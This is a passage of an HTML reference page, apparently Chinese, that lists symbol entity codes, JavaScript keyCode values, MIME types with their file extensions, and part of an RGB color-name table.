            <td>☮</td><td class="fuhao_text">&amp;#9774</td>
            <td>☯</td><td class="fuhao_text">&amp;#9775</td>
        </tr>
        <tr>
            <td>♨</td><td class="fuhao_text">&amp;#9832</td>
            <td>♲</td><td class="fuhao_text">&amp;#9842</td>
            <td>♳</td><td class="fuhao_text">&amp;#9843</td>
            <td>♴</td><td class="fuhao_text">&amp;#9844</td>
            <td>♵</td><td class="fuhao_text">&amp;#9845</td>
        </tr>
        <tr>
            <td>♶</td><td class="fuhao_text">&amp;#9846</td>
            <td>♷</td><td class="fuhao_text">&amp;#9847</td>
            <td>♸</td><td class="fuhao_text">&amp;#9848</td>
            <td>♹</td><td class="fuhao_text">&amp;#9849</td>
            <td>♺</td><td class="fuhao_text">&amp;#9850</td>
        </tr>
        <tr>
            <td>♻</td><td class="fuhao_text">&amp;#9851</td>
            <td>♼</td><td class="fuhao_text">&amp;#9852</td>
            <td>♽</td><td class="fuhao_text">&amp;#9853</td>
            <td>♾</td><td class="fuhao_text">&amp;#9854</td>
            <td>♿</td><td class="fuhao_text">&amp;#9855</td>
        </tr>
        <tr>
            <td>⚐</td><td class="fuhao_text">&amp;#9872</td>
            <td>⚑</td><td class="fuhao_text">&amp;#9873</td>
            <td>⚒</td><td class="fuhao_text">&amp;#9874</td>
            <td>⚓</td><td class="fuhao_text">&amp;#9875</td>
            <td>⚔</td><td class="fuhao_text">&amp;#9876</td>
        </tr>
        <tr>
            <td>⚕</td><td class="fuhao_text">&amp;#9877</td>
            <td>⚖</td><td class="fuhao_text">&amp;#9878</td>
            <td>⚗</td><td class="fuhao_text">&amp;#9879</td>
            <td>⚘</td><td class="fuhao_text">&amp;#9880</td>
            <td>⚙</td><td class="fuhao_text">&amp;#9881</td>
        </tr>
        <tr>
            <td>⚚</td><td class="fuhao_text">&amp;#9882</td>
            <td>⚜</td><td class="fuhao_text">&amp;#9884</td>
            <td>⚠</td><td class="fuhao_text">&amp;#9888</td>
            <td>⚡</td><td class="fuhao_text">&amp;#9889</td>
            <td>☸</td><td class="fuhao_text">&amp;#9784</td>
        </tr>
        <tr>
            <td>⚶</td><td class="fuhao_text">&amp;#9910</td>
            <td>⚷</td><td class="fuhao_text">&amp;#9911</td>
            <td>⚸</td><td class="fuhao_text">&amp;#9912</td>
            <td>⚹</td><td class="fuhao_text">&amp;#9913</td>
            <td>⚺</td><td class="fuhao_text">&amp;#9914</td>
        </tr>
        <tr>
            <td>⚻</td><td class="fuhao_text">&amp;#9915</td>
            <td>⚼</td><td class="fuhao_text">&amp;#9916</td>
            <td>⚽</td><td class="fuhao_text">&amp;#9917</td>
            <td>⚾</td><td class="fuhao_text">&amp;#9918</td>
            <td>♓</td><td class="fuhao_text">&amp;#9811</td>
        </tr>
        <tr>
            <td>⛔</td><td class="fuhao_text">&amp;#9940</td>
            <td>⛲</td><td class="fuhao_text">&amp;#9970</td>
            <td>⛳</td><td class="fuhao_text">&amp;#9971</td>
            <td>⛪</td><td class="fuhao_text">&amp;#9962</td>
            <td>⛵</td><td class="fuhao_text">&amp;#9973</td>
        </tr>
        <tr>
            <td>⛺</td><td class="fuhao_text">&amp;#9978</td>
            <td>⛽</td><td class="fuhao_text">&amp;#9981</td>
            <td>≜</td><td class="fuhao_text">&amp;#8796</td>
            <td>№</td><td class="fuhao_text">&amp;#8470</td>
            <td>ℛ</td><td class="fuhao_text">&amp;#8475</td>
        </tr>
        <tr>
            <td>✁</td><td class="fuhao_text">&amp;#9985</td>
            <td>✂</td><td class="fuhao_text">&amp;#9986</td>
            <td>✃</td><td class="fuhao_text">&amp;#9987</td>
            <td>✄</td><td class="fuhao_text">&amp;#9988</td>
            <td>✆</td><td class="fuhao_text">&amp;#9990</td>
        </tr>
        <tr>
            <td>✇</td><td class="fuhao_text">&amp;#9991</td>
            <td>✈</td><td class="fuhao_text">&amp;#9992</td>
            <td>✉</td><td class="fuhao_text">&amp;#9993</td>
            <td>✊</td><td class="fuhao_text">&amp;#9994</td>
            <td>✋</td><td class="fuhao_text">&amp;#9995</td>
        </tr>
        <tr>
            <td>✌</td><td class="fuhao_text">&amp;#9996</td>
            <td>✍</td><td class="fuhao_text">&amp;#9997</td>
            <td>✎</td><td class="fuhao_text">&amp;#9998</td>
            <td>✏</td><td class="fuhao_text">&amp;#9999</td>
            <td>✐</td><td class="fuhao_text">&amp;#10000</td>
        </tr>
        <tr>
            <td>✑</td><td class="fuhao_text">&amp;#10001</td>
            <td>✒</td><td class="fuhao_text">&amp;#10002</td>
            <td>❓</td><td class="fuhao_text">&amp;#10067</td>
            <td>❔</td><td class="fuhao_text">&amp;#10068</td>
            <td>❕</td><td class="fuhao_text">&amp;#10069</td>
        </tr>
        <tr>
            <td>❤</td><td class="fuhao_text">&amp;#10084</td>
            <td>❥</td><td class="fuhao_text">&amp;#10085</td>
            <td>❦</td><td class="fuhao_text">&amp;#10086</td>
            <td>❧</td><td class="fuhao_text">&amp;#10087</td>
            <td>ℒ</td><td class="fuhao_text">&amp;#8466</td>
        </tr>
    </tbody>
</table>
</div>

<div id="keycode">
<h3>键码值</h3>

<table cellSpacing=1 cellPadding=1 width="100%" bgColor=#999999 border=0>
  <tbody>
      <tr align=center bgcolor=#fff> <td colSpan=8> <strong>字母和数字键的键码值(keyCode)</strong> </td> </tr>
      <tr align=center bgColor=#dddddd>
          <td>按键</td><td>键码</td> <td>按键</td><td>键码</td> <td>按键</td><td>键码</td> <td>按键</td><td>键码</td>
      </tr>
      <tr align=center bgcolor=#fff>
          <td>A</td> <td>65</td>
          <td>J</td> <td>74</td>
          <td>S</td> <td>83</td>
          <td>1</td> <td>49</td>
      </tr>
      <tr align=center bgcolor=#fff>
          <td>B</td> <td>66</td>
          <td>K</td> <td>75</td>
          <td>T</td> <td>84</td>
          <td>2</td> <td>50</td>
      </tr>
      <tr align=center bgcolor=#fff>
          <td>C</td> <td>67</td>
          <td>L</td> <td>76</td>
          <td>U</td> <td>85</td>
          <td>3</td> <td>51</td>
      </tr>
      <tr align=center bgcolor=#fff>
          <td>D</td> <td>68</td>
          <td>M</td> <td>77</td>
          <td>V</td> <td>86</td>
          <td>4</td> <td>52</td>
      </tr>
      <tr align=center bgcolor=#fff>
          <td>E</td> <td>69</td>
          <td>N</td> <td>78</td>
          <td>W</td> <td>87</td>
          <td>5</td> <td>53</td>
      </tr>
      <tr align=center bgcolor=#fff>
          <td>F</td> <td>70</td>
          <td>O</td> <td>79</td>
          <td>X</td> <td>88</td>
          <td>6</td> <td>54</td>
      </tr>
      <tr align=center bgcolor=#fff>
          <td>G</td> <td>71</td>
          <td>P</td> <td>80</td>
          <td>Y</td> <td>89</td>
          <td>7</td> <td>55</td>
      </tr>
      <tr align=center bgcolor=#fff>
          <td>H</td> <td>72</td>
          <td>Q</td> <td>81</td>
          <td>Z</td> <td>90</td>
          <td>8</td> <td>56</td>
      </tr>
      <tr align=center bgcolor=#fff>
          <td>I</td> <td>73</td>
          <td>R</td> <td>82</td>
          <td>0</td> <td>48</td>
          <td>9</td> <td>57</td>
      </tr>
  </tbody>
</table>

<br>
<table cellSpacing=1 cellPadding=1 width="100%" bgColor=#999999 border=0>
    <tbody>
        <tr align=center bgcolor=#fff>
            <td colSpan=4><strong>数字键盘上的键的键码值(keyCode)</strong></td>
            <td colSpan=4><strong>功能键键码值(keyCode)</strong></td>
        </tr>
        <tr align=center bgColor=#dddddd>
            <td>按键</td><td>键码</td><td>按键</td><td>键码</td><td>按键</td><td>键码</td><td>按键</td><td>键码</td>
        </tr>
        <tr align=center bgcolor=#fff>
            <td>0</td> <td>96</td>
            <td>8</td> <td>104</td>
            <td>F1</td> <td>112</td>
            <td>F7</td> <td>118</td>
        </tr>
        <tr align=center bgcolor=#fff>
            <td>1</td> <td>97</td>
            <td>9</td> <td>105</td>
            <td>F2</td> <td>113</td>
            <td>F8</td> <td>119</td>
        </tr>
        <tr align=center bgcolor=#fff>
            <td>2</td> <td>98</td>
            <td>*</td> <td>106</td>
            <td>F3</td> <td>114</td>
            <td>F9</td> <td>120</td>
        </tr>
        <tr align=center bgcolor=#fff>
            <td>3</td> <td>99</td>
            <td>+</td> <td>107</td>
            <td>F4</td> <td>115</td>
            <td>F10</td> <td>121</td>
        </tr>
        <tr align=center bgcolor=#fff>
            <td>4</td> <td>100</td>
            <td>Enter</td> <td>108</td>
            <td>F5</td> <td>116</td>
            <td>F11</td> <td>122</td>
        </tr>
        <tr align=center bgcolor=#fff>
            <td>5</td> <td>101</td>
            <td>-</td> <td>109</td>
            <td>F6</td> <td>117</td>
            <td>F12</td> <td>123</td>
        </tr>
        <tr align=center bgcolor=#fff>
            <td>6</td> <td>102</td>
            <td>.</td> <td>110</td>
            <td></td><td></td><td></td><td></td>
        </tr>
        <tr align=center bgcolor=#fff>
            <td>7</td> <td>103</td>
            <td>/</td> <td>111</td>
            <td></td><td></td><td></td><td></td>
        </tr>
    </tbody>
</table>

<br>
<table width="100%">
    <tbody>
        <tr align=center bgcolor=#fff> <td colSpan=8> <strong>控制键键码值(keyCode)</strong> </td> </tr>
        <tr align=center bgColor=#dddddd>
            <td>按键</td><td>键码</td><td>按键</td><td>键码</td><td>按键</td><td>键码</td><td>按键</td><td>键码</td>
        </tr>
        <tr align=center bgcolor=#fff>
            <td>BackSpace</td> <td>8</td>
            <td>Esc</td>       <td>27</td>
            <td>Right Arrow</td> <td>39</td>
            <td>-_</td>        <td>189</td>
        </tr>
        <tr align=center bgcolor=#fff>
            <td>Tab</td>       <td>9</td>
            <td>Spacebar</td>  <td>32</td>
            <td>Dw Arrow</td>  <td>40</td>
            <td>.&gt;</td>     <td>190</td>
        </tr>
        <tr align=center bgcolor=#fff>
            <td>Clear</td>     <td>12</td>
            <td>Page Up</td>   <td>33</td>
            <td>Insert</td>    <td>45</td>
            <td>/?</td>        <td>191</td>
        </tr>
        <tr align=center bgcolor=#fff>
            <td>Enter</td>     <td>13</td>
            <td>Page Down</td> <td>34</td>
            <td>Delete</td>    <td>46</td>
            <td>`~</td>        <td>192</td>
        </tr>
        <tr align=center bgcolor=#fff>
            <td>Shift</td>     <td>16</td>
            <td>End</td>       <td>35</td>
            <td>Num Lock</td>  <td>144</td>
            <td>[{</td>        <td>219</td>
        </tr>
        <tr align=center bgcolor=#fff>
            <td>Control</td>   <td>17</td>
            <td>Home</td>      <td>36</td>
            <td>;:</td>        <td>186</td>
            <td>|</td>         <td>220</td>
        </tr>
        <tr align=center bgcolor=#fff>
            <td>Alt</td>       <td>18</td>
            <td>Left Arrow</td><td>37</td>
            <td>=+</td>        <td>187</td>
            <td>]}</td>        <td>221</td>
        </tr>
        <tr align=center bgcolor=#fff>
            <td>Cape Lock</td> <td>20</td>
            <td>Up Arrow</td>  <td>38</td>
            <td>,&lt;</td>     <td>188</td>
            <td>'"</td>        <td>222</td>
        </tr>
    </tbody>
</table>

<br>
<table width="100%">
    <tbody>
        <tr align=center bgcolor=#fff><td colSpan=8> <strong>多媒体键码值(keyCode)</strong> </td></tr>
        <tr align=center bgColor=#dddddd><td>按键</td><td>键码</td> </tr>
        <tr align=center bgcolor=#fff><td>音量加</td> <td>175</td></tr>
        <tr align=center bgcolor=#fff><td>音量减</td> <td>174</td></tr>
        <tr align=center bgcolor=#fff><td>停止</td> <td>179</td></tr>
        <tr align=center bgcolor=#fff><td>静音</td> <td>173</td></tr>
        <tr align=center bgcolor=#fff><td>浏览器</td> <td>172</td></tr>
        <tr align=center bgcolor=#fff><td>邮件</td> <td>180</td></tr>
        <tr align=center bgcolor=#fff><td>搜索</td> <td>170</td></tr>
        <tr align=center bgcolor=#fff><td>收藏</td> <td>171</td></tr>
    </tbody>
</table>

</div>

<!-------------------------------------------- MIME_type -------------------------->
<div id="Mime-Type">
<h3>MIME_type类型:类型/子类型 扩展名</h3><pre>
MIME type的缩写为(Multipurpose Internet Mail Extensions)代表互联网媒体类型(Internet media type),MIME使用一个简单的字符串组成,最初是为了标识邮件Email附件的类型,在html文件中可以使用Content-Type属性表示,描述文件类型的互联网标准。

MIME类型能包含视频、图像、文本、音频、应用程序等数据

Mime-Type = type "/" subtype *( ";" parameter )

Content-Type: [type]/[subtype]; parameter

type的形式
Text:用于标准化地表示的文本信息,文本消息可以是多种字符集和或者多种格式的;
Multipart:用于连接消息体的多个部分构成一个消息,这些部分可以是不同类型的数据;
Application:用于传输应用程序数据或者二进制数据;
Message:用于包装一个E-mail消息;
Image:用于传输静态图片数据;
Audio:用于传输音频或者音声数据;
Video:用于传输动态影像数据,可以是与音频编辑在一起的视频数据格式。

subtype用于指定type的详细形式。content-type/subtype配对的集合和与此相关的参数,将随着时间而增长。为了确保这些值在一个有序而且公开的状态下开发,MIME使用Internet Assigned Numbers Authority(IANA)作为中心的注册机制来管理这些值。

parameter可以用来指定附加的信息,更多情况下是用于指定text/plain和text/htm等的文字编码方式的charset参数。MIME根据type制定了默认的subtype,当客户端不能确定消息的subtype的情况下,消息被看作默认的subtype进行处理。Text默认是text/plain,Application默认是application/octet-stream而Multipart默认情况下被看作multipart/mixed。

</pre>

<table>
  <tr><td>application/envoy</td> <td>evy</td></tr>
  <tr><td>application/fractals</td> <td>fif</td></tr>
  <tr><td>application/futuresplash</td> <td>spl</td></tr>
  <tr><td>application/hta</td> <td>hta</td></tr>
  <tr><td>application/internet-property-stream</td> <td>acx</td></tr>
  <tr><td>application/mac-binhex40</td> <td>hqx</td></tr>
  <tr><td>application/msword</td> <td>doc</td></tr>
  <tr><td>application/msword</td> <td>dot</td></tr>
  <tr><td>application/octet-stream</td> <td>*</td></tr>
  <tr><td>application/octet-stream</td> <td>bin</td></tr>
  <tr><td>application/octet-stream</td> <td>class</td></tr>
  <tr><td>application/octet-stream</td> <td>dms</td></tr>
  <tr><td>application/octet-stream</td> <td>exe</td></tr>
  <tr><td>application/octet-stream</td> <td>lha</td></tr>
  <tr><td>application/octet-stream</td> <td>lzh</td></tr>
  <tr><td>application/oda</td> <td>oda</td></tr>
  <tr><td>application/olescript</td> <td>axs</td></tr>
  <tr><td>application/pdf</td> <td>pdf</td></tr>
  <tr><td>application/pics-rules</td> <td>prf</td></tr>
  <tr><td>application/pkcs10</td> <td>p10</td></tr>
  <tr><td>application/pkix-crl</td> <td>crl</td></tr>
  <tr><td>application/postscript</td> <td>ai</td></tr>
  <tr><td>application/postscript</td> <td>eps</td></tr>
  <tr><td>application/postscript</td> <td>ps</td></tr>
  <tr><td>application/rtf</td> <td>rtf</td></tr>
  <tr><td>application/set-payment-initiation</td> <td>setpay</td></tr>
  <tr><td>application/set-registration-initiation</td> <td>setreg</td></tr>
  <tr><td>application/vnd.ms-excel</td> <td>xla</td></tr>
  <tr><td>application/vnd.ms-excel</td> <td>xlc</td></tr>
  <tr><td>application/vnd.ms-excel</td> <td>xlm</td></tr>
  <tr><td>application/vnd.ms-excel</td> <td>xls</td></tr>
  <tr><td>application/vnd.ms-excel</td> <td>xlt</td></tr>
  <tr><td>application/vnd.ms-excel</td> <td>xlw</td></tr>
  <tr><td>application/vnd.ms-outlook</td> <td>msg</td></tr>
  <tr><td>application/vnd.ms-pkicertstore</td> <td>sst</td></tr>
  <tr><td>application/vnd.ms-pkiseccat</td> <td>cat</td></tr>
  <tr><td>application/vnd.ms-pkistl</td> <td>stl</td></tr>
  <tr><td>application/vnd.ms-powerpoint</td> <td>pot</td></tr>
  <tr><td>application/vnd.ms-powerpoint</td> <td>pps</td></tr>
  <tr><td>application/vnd.ms-powerpoint</td> <td>ppt</td></tr>
  <tr><td>application/vnd.ms-project</td> <td>mpp</td></tr>
  <tr><td>application/vnd.ms-works</td> <td>wcm</td></tr>
  <tr><td>application/vnd.ms-works</td> <td>wdb</td></tr>
  <tr><td>application/vnd.ms-works</td> <td>wks</td></tr>
  <tr><td>application/vnd.ms-works</td> <td>wps</td></tr>
  <tr><td>application/winhlp</td> <td>hlp</td></tr>
  <tr><td>application/x-bcpio</td> <td>bcpio</td></tr>
  <tr><td>application/x-cdf</td> <td>cdf</td></tr>
  <tr><td>application/x-compress</td> <td>z</td></tr>
  <tr><td>application/x-compressed</td> <td>tgz</td></tr>
  <tr><td>application/x-cpio</td> <td>cpio</td></tr>
  <tr><td>application/x-csh</td> <td>csh</td></tr>
  <tr><td>application/x-director</td> <td>dcr</td></tr>
  <tr><td>application/x-director</td> <td>dir</td></tr>
  <tr><td>application/x-director</td> <td>dxr</td></tr>
  <tr><td>application/x-dvi</td> <td>dvi</td></tr>
  <tr><td>application/x-gtar</td> <td>gtar</td></tr>
  <tr><td>application/x-gzip</td> <td>gz</td></tr>
  <tr><td>application/x-hdf</td> <td>hdf</td></tr>
  <tr><td>application/x-internet-signup</td> <td>ins</td></tr>
  <tr><td>application/x-internet-signup</td> <td>isp</td></tr>
  <tr><td>application/x-iphone</td> <td>iii</td></tr>
  <tr><td>application/x-javascript</td> <td>js</td></tr>
  <tr><td>application/x-latex</td> <td>latex</td></tr>
  <tr><td>application/x-msaccess</td> <td>mdb</td></tr>
  <tr><td>application/x-mscardfile</td> <td>crd</td></tr>
  <tr><td>application/x-msclip</td> <td>clp</td></tr>
  <tr><td>application/x-msdownload</td> <td>dll</td></tr>
  <tr><td>application/x-msmediaview</td> <td>m13</td></tr>
  <tr><td>application/x-msmediaview</td> <td>m14</td></tr>
  <tr><td>application/x-msmediaview</td> <td>mvb</td></tr>
  <tr><td>application/x-msmetafile</td> <td>wmf</td></tr>
  <tr><td>application/x-msmoney</td> <td>mny</td></tr>
  <tr><td>application/x-mspublisher</td> <td>pub</td></tr>
  <tr><td>application/x-msschedule</td> <td>scd</td></tr>
  <tr><td>application/x-msterminal</td> <td>trm</td></tr>
  <tr><td>application/x-mswrite</td> <td>wri</td></tr>
  <tr><td>application/x-netcdf</td> <td>cdf</td></tr>
  <tr><td>application/x-netcdf</td> <td>nc</td></tr>
  <tr><td>application/x-perfmon</td> <td>pma</td></tr>
  <tr><td>application/x-perfmon</td> <td>pmc</td></tr>
  <tr><td>application/x-perfmon</td> <td>pml</td></tr>
  <tr><td>application/x-perfmon</td> <td>pmr</td></tr>
  <tr><td>application/x-perfmon</td> <td>pmw</td></tr>
  <tr><td>application/x-pkcs12</td> <td>p12</td></tr>
  <tr><td>application/x-pkcs12</td> <td>pfx</td></tr>
  <tr><td>application/x-pkcs7-certificates</td> <td>p7b</td></tr>
  <tr><td>application/x-pkcs7-certificates</td> <td>spc</td></tr>
  <tr><td>application/x-pkcs7-certreqresp</td> <td>p7r</td></tr>
  <tr><td>application/x-pkcs7-mime</td> <td>p7c</td></tr>
  <tr><td>application/x-pkcs7-mime</td> <td>p7m</td></tr>
  <tr><td>application/x-pkcs7-signature</td> <td>p7s</td></tr>
  <tr><td>application/x-sh</td> <td>sh</td></tr>
  <tr><td>application/x-shar</td> <td>shar</td></tr>
  <tr><td>application/x-shockwave-flash</td> <td>swf</td></tr>
  <tr><td>application/x-stuffit</td> <td>sit</td></tr>
  <tr><td>application/x-sv4cpio</td> <td>sv4cpio</td></tr>
  <tr><td>application/x-sv4crc</td> <td>sv4crc</td></tr>
  <tr><td>application/x-tar</td> <td>tar</td></tr>
  <tr><td>application/x-tcl</td> <td>tcl</td></tr>
  <tr><td>application/x-tex</td> <td>tex</td></tr>
  <tr><td>application/x-texinfo</td> <td>texi</td></tr>
  <tr><td>application/x-texinfo</td> <td>texinfo</td></tr>
  <tr><td>application/x-troff</td> <td>roff</td></tr>
  <tr><td>application/x-troff</td> <td>t</td></tr>
  <tr><td>application/x-troff</td> <td>tr</td></tr>
  <tr><td>application/x-troff-man</td> <td>man</td></tr>
  <tr><td>application/x-troff-me</td> <td>me</td></tr>
  <tr><td>application/x-troff-ms</td> <td>ms</td></tr>
  <tr><td>application/x-ustar</td> <td>ustar</td></tr>
  <tr><td>application/x-wais-source</td> <td>src</td></tr>
  <tr><td>application/x-x509-ca-cert</td> <td>cer</td></tr>
  <tr><td>application/x-x509-ca-cert</td> <td>crt</td></tr>
  <tr><td>application/x-x509-ca-cert</td> <td>der</td></tr>
  <tr><td>application/ynd.ms-pkipko</td> <td>pko</td></tr>
  <tr><td>application/zip</td> <td>zip</td></tr>
  <tr><td>audio/basic</td> <td>au</td></tr>
  <tr><td>audio/basic</td> <td>snd</td></tr>
  <tr><td>audio/mid</td> <td>mid</td></tr>
  <tr><td>audio/mid</td> <td>rmi</td></tr>
  <tr><td>audio/mpeg</td> <td>mp3</td></tr>
  <tr><td>audio/x-aiff</td> <td>aif</td></tr>
  <tr><td>audio/x-aiff</td> <td>aifc</td></tr>
  <tr><td>audio/x-aiff</td> <td>aiff</td></tr>
  <tr><td>audio/x-mpegurl</td> <td>m3u</td></tr>
  <tr><td>audio/x-pn-realaudio</td> <td>ra</td></tr>
  <tr><td>audio/x-pn-realaudio</td> <td>ram</td></tr>
  <tr><td>audio/x-wav</td> <td>wav</td></tr>
  <tr><td>image/bmp</td> <td>bmp</td></tr>
  <tr><td>image/cis-cod</td> <td>cod</td></tr>
  <tr><td>image/gif</td> <td>gif</td></tr>
  <tr><td>image/ief</td> <td>ief</td></tr>
  <tr><td>image/jpeg</td> <td>jpe</td></tr>
  <tr><td>image/jpeg</td> <td>jpeg</td></tr>
  <tr><td>image/jpeg</td> <td>jpg</td></tr>
  <tr><td>image/pipeg</td> <td>jfif</td></tr>
  <tr><td>image/svg+xml</td> <td>svg</td></tr>
  <tr><td>image/tiff</td> <td>tif</td></tr>
  <tr><td>image/tiff</td> <td>tiff</td></tr>
  <tr><td>image/x-cmu-raster</td> <td>ras</td></tr>
  <tr><td>image/x-cmx</td> <td>cmx</td></tr>
  <tr><td>image/x-icon</td> <td>ico</td></tr>
  <tr><td>image/x-portable-anymap</td> <td>pnm</td></tr>
  <tr><td>image/x-portable-bitmap</td> <td>pbm</td></tr>
  <tr><td>image/x-portable-graymap</td> <td>pgm</td></tr>
  <tr><td>image/x-portable-pixmap</td> <td>ppm</td></tr>
  <tr><td>image/x-rgb</td> <td>rgb</td></tr>
  <tr><td>image/x-xbitmap</td> <td>xbm</td></tr>
  <tr><td>image/x-xpixmap</td> <td>xpm</td></tr>
  <tr><td>image/x-xwindowdump</td> <td>xwd</td></tr>
  <tr><td>message/rfc822</td> <td>mht</td></tr>
  <tr><td>message/rfc822</td> <td>mhtml</td></tr>
  <tr><td>message/rfc822</td> <td>nws</td></tr>
  <tr><td>text/css</td> <td>css</td></tr>
  <tr><td>text/h323</td> <td>323</td></tr>
  <tr><td>text/html</td> <td>htm</td></tr>
  <tr><td>text/html</td> <td>html</td></tr>
  <tr><td>text/html</td> <td>stm</td></tr>
  <tr><td>text/iuls</td> <td>uls</td></tr>
  <tr><td>text/plain</td> <td>bas</td></tr>
  <tr><td>text/plain</td> <td>c</td></tr>
  <tr><td>text/plain</td> <td>h</td></tr>
  <tr><td>text/plain</td> <td>txt</td></tr>
  <tr><td>text/richtext</td> <td>rtx</td></tr>
  <tr><td>text/scriptlet</td> <td>sct</td></tr>
  <tr><td>text/tab-separated-values</td> <td>tsv</td></tr>
  <tr><td>text/webviewhtml</td> <td>htt</td></tr>
  <tr><td>text/x-component</td> <td>htc</td></tr>
  <tr><td>text/x-setext</td> <td>etx</td></tr>
  <tr><td>text/x-vcard</td> <td>vcf</td></tr>
  <tr><td>video/mpeg</td> <td>mp2</td></tr>
  <tr><td>video/mpeg</td> <td>mpa</td></tr>
  <tr><td>video/mpeg</td> <td>mpe</td></tr>
  <tr><td>video/mpeg</td> <td>mpeg</td></tr>
  <tr><td>video/mpeg</td> <td>mpg</td></tr>
  <tr><td>video/mpeg</td> <td>mpv2</td></tr>
  <tr><td>video/quicktime</td> <td>mov</td></tr>
  <tr><td>video/quicktime</td> <td>qt</td></tr>
  <tr><td>video/x-la-asf</td> <td>lsf</td></tr>
  <tr><td>video/x-la-asf</td> <td>lsx</td></tr>
  <tr><td>video/x-ms-asf</td> <td>asf</td></tr>
  <tr><td>video/x-ms-asf</td> <td>asr</td></tr>
  <tr><td>video/x-ms-asf</td> <td>asx</td></tr>
  <tr><td>video/x-msvideo</td> <td>avi</td></tr>
  <tr><td>video/x-sgi-movie</td> <td>movie</td></tr>
  <tr><td>x-world/x-vrml</td> <td>flr</td></tr>
  <tr><td>x-world/x-vrml</td> <td>vrml</td></tr>
  <tr><td>x-world/x-vrml</td> <td>wrl</td></tr>
  <tr><td>x-world/x-vrml</td> <td>wrz</td></tr>
  <tr><td>x-world/x-vrml</td> <td>xaf</td></tr>
  <tr><td>x-world/x-vrml</td> <td>xof</td></tr>
</table>
</div>

<div id="color">
<h3>RGB颜色对照表</h3>
<table width="100%" cellpadding="5">
    <tr>
    <th>实色效果</th><th>英文名称</th><th>R.G.B</th><th>16色</th>
    <th>实色效果</th><th>英文名称</th><th>R.G.B</th><th>16色</th>
   </tr>
   <tr>
    <td style="background:rgb(255, 250, 250);"></td><td>Snow</td><td>255 250 250</td><td>#FFFAFA</td>
    <td style="background:rgb(187, 255, 255);"></td><td>PaleTurquoise1</td><td>187 255 255</td><td>#BBFFFF</td>
   </tr>
   <tr>
    <td style="background:rgb(248, 248, 255);"></td><td>GhostWhite</td><td>248 248 255</td><td>#F8F8FF</td>
    <td style="background:rgb(174, 238, 238);"></td><td>PaleTurquoise2</td><td>174 238 238</td><td>#AEEEEE</td>
   </tr>
   <tr>
    <td style="background:rgb(245, 245, 245);"></td><td>WhiteSmoke</td><td>245 245 245</td><td>#F5F5F5</td>
    <td style="background:rgb(150, 205, 205);"></td><td>PaleTurquoise3</td><td>150 205 205</td><td>#96CDCD</td>
   </tr>
   <tr>
    <td style="background:rgb(220, 220, 220);"></td><td>Gainsboro</td><td>220 220 220</td><td>#DCDCDC</td>
    <td style="background:rgb(102, 139, 139);"></td><td>PaleTurquoise4</td><td>102 139 139</td><td>#668B8B</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 250, 240);"></td><td>FloralWhite</td><td>255 250 240</td><td>#FFFAF0</td>
    <td style="background:rgb(152, 245, 255);"></td><td>CadetBlue1</td><td>152 245 255</td><td>#98F5FF</td>
   </tr>
   <tr>
    <td style="background:rgb(253, 245, 230);"></td><td>OldLace</td><td>253 245 230</td><td>#FDF5E6</td>
    <td style="background:rgb(142, 229, 238);"></td><td>CadetBlue2</td><td>142 229 238</td><td>#8EE5EE</td>
   </tr>
   <tr>
    <td style="background:rgb(250, 240, 230);"></td><td>Linen</td><td>250 240 230</td><td>#FAF0E6</td>
    <td style="background:rgb(122, 197, 205);"></td><td>CadetBlue3</td><td>122 197 205</td><td>#7AC5CD</td>
   </tr>
   <tr>
    <td style="background:rgb(250, 235, 215);"></td><td>AntiqueWhite</td><td>250 235 215</td><td>#FAEBD7</td>
    <td style="background:rgb(83, 134, 139);"></td><td>CadetBlue4</td><td>83 134 139</td><td>#53868B</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 239, 213);"></td><td>PapayaWhip</td><td>255 239 213</td><td>#FFEFD5</td>
    <td style="background:rgb(0, 245, 255);"></td><td>Turquoise1</td><td>0 245 255</td><td>#00F5FF</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 235, 205);"></td><td>BlanchedAlmond</td><td>255 235 205</td><td>#FFEBCD</td>
    <td style="background:rgb(0, 229, 238);"></td><td>Turquoise2</td><td>0 229 238</td><td>#00E5EE</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 228, 196);"></td><td>Bisque</td><td>255 228 196</td><td>#FFE4C4</td>
    <td style="background:rgb(0, 197, 205);"></td><td>Turquoise3</td><td>0 197 205</td><td>#00C5CD</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 218, 185);"></td><td>PeachPuff</td><td>255 218 185</td><td>#FFDAB9</td>
    <td style="background:rgb(0, 134, 139);"></td><td>Turquoise4</td><td>0 134 139</td><td>#00868B</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 222, 173);"></td><td>NavajoWhite</td><td>255 222 173</td><td>#FFDEAD</td>
    <td style="background:rgb(0, 255, 255);"></td><td>Cyan1</td><td>0 255 255</td><td>#00FFFF</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 228, 181);"></td><td>Moccasin</td><td>255 228 181</td><td>#FFE4B5</td>
    <td style="background:rgb(0, 238, 238);"></td><td>Cyan2</td><td>0 238 238</td><td>#00EEEE</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 248, 220);"></td><td>Cornsilk</td><td>255 248 220</td><td>#FFF8DC</td>
    <td style="background:rgb(0, 205, 205);"></td><td>Cyan3</td><td>0 205 205</td><td>#00CDCD</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 255, 240);"></td><td>Ivory</td><td>255 255 240</td><td>#FFFFF0</td>
    <td style="background:rgb(0, 139, 139);"></td><td>Cyan4</td><td>0 139 139</td><td>#008B8B</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 250, 205);"></td><td>LemonChiffon</td><td>255 250 205</td><td>#FFFACD</td>
    <td style="background:rgb(151, 255, 255);"></td><td>DarkSlateGray1</td><td>151 255 255</td><td>#97FFFF</td>
   </tr>
   <tr>
    <td style="background:rgb(255, 245, 238);"></td><td>Seashell</td><td>255 245 238</td><td>#FFF5EE</td>
    <td style="background:rgb(141, 238, 238);"></td><td>DarkSlateGray2</td><td>141 238 238</td><td>#8DEEEE</td>
   </tr>
   <tr>
    <td style="background:rgb(240, 255, 240);"></td><td>Honeydew</td><td>240 255 240</td><td>#F0FFF0</td>
    <td style="background:rgb(121, 205, 205);"></td><td>DarkSlateGray3</td><td>121 205 205</td><td>#79CDCD</td>
   </tr>
   <tr>
    <td style="background:rgb(245, 255, 250);"></td><td>MintCream</td><td>245 255 250</td><td>#F5FFFA</td>
    <td style="background:rgb(82, 139, 139);"></td><td>DarkSlateGray4</td><td>82 139 139</td><td>#528B8B</td>
   </tr>
   <tr>
